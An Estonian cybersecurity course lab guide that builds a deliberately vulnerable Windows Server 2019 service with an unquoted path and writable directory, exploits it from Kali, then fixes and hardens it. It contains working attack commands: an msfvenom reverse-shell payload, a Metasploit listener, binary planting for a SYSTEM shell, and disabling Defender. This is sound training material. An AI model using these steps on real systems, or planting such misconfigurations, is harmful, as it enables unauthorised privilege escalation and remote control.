# Windowsi õiguste eskaleerimise (Privilege Escalation) labor

## Kali Linux + Windows Server 2019 — Proxmox laborikeskkond

*Küberturvalisuse kursuse praktiline labor: haavatavuse loomine, ärakasutamine, parandamine ja kaitsemeetmed.*

---

## 1. Ülevaade ja eesmärk

Selles laboris loovad õpilased kontrollitud ja isoleeritud keskkonna, kus:

1. **Windows Server 2019** masinasse seadistatakse teadlikult haavatavus, mis võimaldab tavakasutajal (madalate õigustega kontol) tõsta oma õigusi kohalikuks administraatoriks.
2. **Kali Linux** masinast kasutatakse seda haavatavust ära, et saada SYSTEM/admin tasemel ligipääs.
3. Haavatavus **parandatakse** ja rakendatakse täiendavad kaitsemeetmed.

Valitud haavatavuse tüüp: **unquoted service path** (jutumärkideta teenuse käivitustee) — klassikaline ja pedagoogiliselt väga selge privesc-vektor, mida on lihtne nii luua kui ka seletada, ja mille parandus demonstreerib hästi ka põhimõtet "vähimate õiguste" (least privilege) kohta.

> Soovitus: kasuta seda juhendit raamistikuna **THEORY → EXAMPLE → DEMONSTRATION → PRACTICAL TASK → ANALYSIS → DEFENSE MEASURES**, mis sobib kursuse ülesehitusega.

---

## 2. Eeldused ja turvanõuded

- Labor **peab** töötama täiesti isoleeritud Proxmoxi võrgusegmendis (vt punkt 3), ilma internetiühenduseta tootmisvõrku.
- Masinatel ei tohi olla ligipääsu kooli tegelikule domeenile ega teistele õpilasvõrkudele.
- Iga õpilane/õpilaste rühm saab oma vmbr-numbri (nt vmbr3 → võrk 10.0.3.0/24), nii et laborid ei sega üksteist.
- Windows Server 2019 ISO ja litsents peavad olema koolile seaduslikult kättesaadavad (nt MSDN/Azure Dev Tools for Teaching, evaluation ISO 180 päevaks vms).

---

## 3. Proxmox taristu seadistamine

### 3.1 Võrgu loogika

Iga õpilase/rühma jaoks luuakse Proxmoxis eraldi Linux Bridge (nt `vmbrX`), mis moodustab isoleeritud sisevõrgu:

| Element | Väärtus |
| --- | --- |
| Bridge | `vmbrX` (X = rühma number, nt 3) |
| Võrk | `10.0.X.0/24` |
| Gateway (valikuline) | `10.0.X.1` — ainult kui soovid NAT-väljapääsu |
| Kali Linux IP | `10.0.X.10` |
| Windows Server 2019 IP | `10.0.X.20` |

**Oluline:** bridge ei tohi olla seotud füüsilise NIC-iga (`Autostart` lubatud, aga `Bridge port` tühi), et vältida lekkimist kooli võrku. Kui õpilased vajavad pakettide allalaadimist (nt Kali tööriistade uuendamiseks), kaalu eraldi "management" NIC-i, mis on lüliti abil eraldatud laborivõrgust.

### 3.2 Bridge loomine Proxmoxis

1. Proxmox → vali host (node) → **System → Network**.
2. **Create → Linux Bridge**.
3. Nimi: `vmbrX` (nt `vmbr3`).
4. IPv4/CIDR: `10.0.X.1/24` (kui soovid Proxmoxile endale gateway rolli) või jäta tühjaks, kui soovid täiesti isoleeritud võrku.
5. Bridge ports: **jäta tühjaks** (isoleeritud) või lisa VLAN, kui kasutad segmenteeritud switchi.
6. Apply Configuration.

### 3.3 VM-ide loomine

**Kali Linux VM:**

- Mall: ametlik Kali Linux VM-image (kali.org/get-kali, Virtual Machines sektsioon) või paigalda ISO-lt.
- Ressursid: min 2 vCPU, 4 GB RAM, 40 GB ketas.
- Võrguliides: `vmbrX`.

**Windows Server 2019 VM:**

- Paigalda ISO-lt (Desktop Experience valikuga, et oleks GUI haldamiseks lihtsam).
- Ressursid: min 2 vCPU, 4–8 GB RAM, 60 GB ketas.
- Võrguliides: `vmbrX`.

Mõlemal määra staatiline IP vastavalt tabelile punktis 3.1.

---

## 4. Haavatavuse loomine Windows Server 2019 peal

### 4.1 Idee taga olev teooria

Kui Windowsi teenuse (service) käivitustee (`BINARY_PATH_NAME`) sisaldab tühikuid ja **ei ole jutumärkides**, proovib Windows SCM (Service Control Manager) käivitada teed järjest igas tühiku kohast, kuni leiab käivitatava faili. Näiteks tee:

```
C:\Program Files\My App\service.exe
```

proovitakse järjekorras:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

Kui ründajal on **kirjutusõigus** mõnda neist vahepealsetest kataloogidest (nt `C:\Program Files\`) ja teenus töötab **SYSTEM**-i või administraatori kontekstis, saab ründaja asetada sinna oma pahaloomulise `Program.exe` faili, mis käivitub teenuse taaskäivitamisel SYSTEM-i õigustes.

### 4.2 Samm-sammuline haavatavuse seadistamine

1. **Loo tavakasutaja konto** (madalad õigused), kellega Kali hiljem ühendub:

```powershell
net user labuser Parool123! /add
net localgroup "Remote Desktop Users" labuser /add
```

(RDP-ligipääsu asemel võib kasutada ka SMB/WinRM — vali kursuse vajadusest lähtuvalt.)

2. **Loo kataloog ja "teenuse" näidisrakendus** tühikuga nimega kataloogis, nt:

```powershell
mkdir "C:\Program Files\Vulnerable App"
```

Pane sinna lihtne käivitatav fail `service.exe` (võib olla ükskõik milline tühi/näidis .exe, mis lihtsalt jääb töösse, nt väike C# teenuse mall või isegi `cmd.exe` koopia testimiseks).

3. **Loo Windowsi teenus**, mille binaarpath on jutumärkideta ja sisaldab tühikut:

```powershell
sc.exe create VulnService binPath= "C:\Program Files\Vulnerable App\service.exe" start= auto obj= LocalSystem
```

Pane tähele: `binPath=` väärtus **ei ole jutumärkides**, mistõttu SCM tõlgendab teed tükkidena.

4. **Anna tavakasutajale (labuser) kirjutusõigus** haavatavale kataloogile (nt `C:\Program Files\`), simuleerimaks tüüpilist valesti seadistatud õiguste stsenaariumi:

```powershell
icacls "C:\Program Files" /grant labuser:(OI)(CI)M
```

(`M` = Modify. Reaalses elus tekib selline olukord sageli kolmanda osapoole tarkvara halva paigaldaja tõttu, mis annab liiga avarad õigused.)

5. **Veendu, et teenus töötab** ja on seadistatud automaatselt käivituma:

```powershell
sc.exe start VulnService
sc.exe qc VulnService
```

6. **Lülita RDP sisse** (kui kasutad RDP-d ligipääsuks):

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

7. **Veendu, et Windows Defender reaalajas kaitse on laboritunniks ajutiselt välja lülitatud** (muidu blokeerib see msfvenomi makstud payload'i) — selgita õpilastele, et see on **ainult laborikeskkonnas lubatud** samm, mitte reaalses elus soovitatav:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

---

## 5. Kali Linux poolne ärakasutamine

### 5.1 Luure (reconnaissance)

1. Ühendu Windows Server masinasse `labuser` kontoga (nt RDP kaudu):

```bash
xfreerdp /u:labuser /p:'Parool123!' /v:10.0.X.20
```

Või kasuta `evil-winrm`-i, kui WinRM on lubatud.

2. Laadi sihtmasinasse (või käivita kaugelt) **WinPEAS**, mis automatiseerib privesc-vektorite otsimise:

- Laadi alla Kali masinas: `https://github.com/peass-ng/PEASS-ng/releases` (winPEASx64.exe).
- Jaga faili sihtmasinasse nt SMB kaudu:

```bash
impacket-smbserver share /path/to/winpeas -smb2support
```

Windowsi poolel: `\\10.0.X.10\share\winPEASx64.exe`

3. Käivita WinPEAS sihtmasinas tavakasutaja kontoga ja analüüsi väljundit — see toob välja jaotise **"Unquoted Service Paths"**, märkides haavatava `VulnService` teenuse punaselt/kollaselt.

### 5.2 Manuaalne tuvastus (õppe eesmärgil)

Käsitsi tuvastamine aitab õpilastel mõista, mida WinPEAS automaatselt teeb:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "\"" | findstr /i "auto"
```

See näitab kõiki automaatselt käivituvaid teenuseid, mille tee **ei ole jutumärkides** ja mis sisaldab tühikut.

Kontrolli, kas tavakasutajal on kirjutusõigus vastavasse kataloogi:

```powershell
icacls "C:\Program Files"
```

### 5.3 Ärakasutamine (exploitation)

1. **Genereeri pahaloomuline binaar** Kali masinas `msfvenom`-iga:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.X.10 LPORT=4444 -f exe -o Program.exe
```

2. **Käivita Metasploit listener**:

```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 10.0.X.10; set LPORT 4444; run"
```

3. **Kopeeri `Program.exe` haavatavasse kataloogisse** (kasutades `labuser` ligipääsu, mille lubasime punktis 4.2.4):

```powershell
copy \\10.0.X.10\share\Program.exe "C:\Program Files\Program.exe"
```

4. **Taaskäivita (või oota automaatset taaskäivitust) teenus / server**, mis käivitab SCM-i poolt otsitava `C:\Program Files\Program.exe` **SYSTEM**-i õigustes:

```powershell
sc.exe stop VulnService
sc.exe start VulnService
```

(Praktikas võib vajada serveri taaskäivitust, sõltuvalt teenuse seadetest — see annab hea võimaluse arutada, miks reaalsed ründed sageli ootavad plaanilist taaskäivitust/hooldusakent.)

5. Kali masinas peaks Metasploit handler saama sisse tuleva **reverse shell'i NT AUTHORITY\\SYSTEM** õigustes — kinnita käsuga:

```
whoami
```

### 5.4 Tulemuse kinnitamine ja dokumenteerimine

Õpilased peavad labori aruandes dokumenteerima:

- Kuidas haavatavus tuvastati (WinPEAS väljund / käsitsi kontroll).
- Milline oli algne kasutajaõigus (`labuser`) ja milline saavutati (`SYSTEM`).
- Täpne käskude jada, mida kasutati.
- Ekraanipildid tõendusmaterjalina.

---

## 6. Vea parandamine (remediation)

Pärast ärakasutamise demonstreerimist tuleb haavatavus parandada ja tulemust uuesti testida.

### 6.1 Peamine parandus — jutumärgid teenuse teele

```powershell
sc.exe config VulnService binPath= "\"C:\Program Files\Vulnerable App\service.exe\""
sc.exe qc VulnService
```

Kontrolli, et `BINARY_PATH_NAME` on nüüd täielikult jutumärkides. Taaskäivita teenus ja korda punkti 5.3 — ärakasutamine peaks nüüd ebaõnnestuma, sest SCM ei jaga enam teed tükkideks.

### 6.2 Õiguste parandamine (defense in depth)

Isegi kui tee on jutumärkides, tuleks parandada ka liiga avarad kataloogiõigused, mis haavatavuse algselt võimaldasid:

```powershell
icacls "C:\Program Files" /remove labuser
```

Veendu, et tavakasutajatel on `C:\Program Files\` ja alamkataloogides ainult `Read & Execute`, mitte `Modify`/`Write`.

### 6.3 Kontrolliskript kõigi unquoted path teenuste leidmiseks

Anna õpilastele PowerShelli skript, mida nad saavad kasutada enda/teiste süsteemide auditeerimiseks:

```powershell
Get-WmiObject Win32_Service | 
 Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' -and $_.StartMode -eq 'Auto' } |
 Select-Object Name, DisplayName, PathName, StartMode
```

---

## 7. Lisaturvameetmed (hardening)

Laborile võiks lisada eraldi mooduli, kus õpilased rakendavad laiemaid kaitsemeetmeid ja testivad, et ründevektor on suletud ka alternatiivsete tehnikatega:

1. **Least privilege põhimõte**: audita kõik teenused ja kontrolli, et nad ei tööta `LocalSystem` all, kui see pole hädavajalik — kasuta eraldi teenusekontosid (Managed Service Account/gMSA) piiratud õigustega.
2. **NTFS-õiguste karastamine**: eemalda `Authenticated Users`/`Users` grupilt kirjutusõigus süsteemikataloogidest (`C:\Program Files`, `C:\Windows`).
3. **Windows Defender/EDR aktiveerimine**: lülita reaalajas kaitse tagasi sisse ja testi, kas see tuvastab msfvenom payload'i (hea arutelukoht signatuuri- vs käitumispõhise tuvastuse teemal).
4. **AppLocker / WDAC**: rakenda käivitamispoliitika, mis lubab käivituda ainult kindlatest, usaldusväärsetest asukohtadest (whitelisting), mis blokeeriks ka `Program.exe` käivitumise isegi siis, kui tee on vale.
5. **Logimine ja jälgimine**: lülita sisse Windows Security Event Log (Event ID 7045 — uue teenuse loomine; 4688 — protsessi loomine) ja näita, kuidas rünne oleks tuvastatav SIEM-is (seostades kursuse SIEM/monitoring moodulit).
6. **Regulaarne haavatavuste skaneerimine**: tutvusta tööriistu nagu `PowerUp` (PowerSploit) või `Seatbelt` serveri regulaarseks enda-auditiks.
7. **Teenuste installeri parimad tavad arendajatele**: kui õpilased ise kirjutavad või haldavad tarkvara paigaldajaid, näita, kuidas MSI/installer peaks teenuse registreerimisel alati jutumärke kasutama.

---

## 8. Õpilase ülesanne ja hindamiskriteeriumid

### Praktiline ülesanne

1. Seadista Proxmoxis oma vmbrX võrk ja mõlemad VM-id vastavalt juhendile.
2. Loo Windows Server 2019 peale haavatav teenus (punkt 4).
3. Kasuta Kali Linuxi, et haavatavus tuvastada ja ära kasutada (punkt 5).
4. Dokumenteeri terve ründeahel (kill chain) koos ekraanipiltidega.
5. Paranda haavatavus (punkt 6) ja tõesta, et ründevektor enam ei tööta.
6. Vali ja rakenda vähemalt 2 lisaturvameedet punktist 7, põhjenda valikut.

### Analüüsi küsimused (kirjalik osa)

- Miks on "unquoted service path" haavatavus üldse võimalik — mis on selle juurpõhjus Windowsi arhitektuuris?
- Millised on märgid (indicators of compromise), mida kaitsemeeskond peaks sellise ründe korral logidest otsima?
- Kuidas erineks kaitsestrateegia, kui rünnet teostataks domeenikeskkonnas (Active Directory) versus seisva (standalone) serveri vastu?

### Soovituslik hindamine

- Haavatavuse edukas ärakasutamine ja dokumenteerimine: 40%
- Parandus ja selle tõestamine: 25%
- Lisaturvameetmete rakendamine: 20%
- Analüüsiküsimuste vastused: 15%

---

## 9. Kiirviide — käsud kokkuvõttes

| Etapp | Keskkond | Käsk/tegevus |
| --- | --- | --- |
| Haavatava teenuse loomine | Windows | `sc.exe create VulnService binPath= "C:\Program Files\Vulnerable App\service.exe" start= auto obj= LocalSystem` |
| Õiguste lõdvendamine | Windows | `icacls "C:\Program Files" /grant labuser:(OI)(CI)M` |
| Luure | Kali | WinPEAS käivitamine sihtmasinas |
| Payload loomine | Kali | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.X.10 LPORT=4444 -f exe -o Program.exe` |
| Listener | Kali | `msfconsole -x "use exploit/multi/handler..."` |
| Ärakasutamine | Windows | Kopeeri `Program.exe` → `C:\Program Files\Program.exe`, taaskäivita teenus |
| Parandus | Windows | `sc.exe config VulnService binPath= "\"C:\Program Files\Vulnerable App\service.exe\""` |
| Õiguste parandus | Windows | `icacls "C:\Program Files" /remove labuser` |
| Auditiskript | Windows | PowerShelli `Get-WmiObject Win32_Service` päring (vt 6.3) |
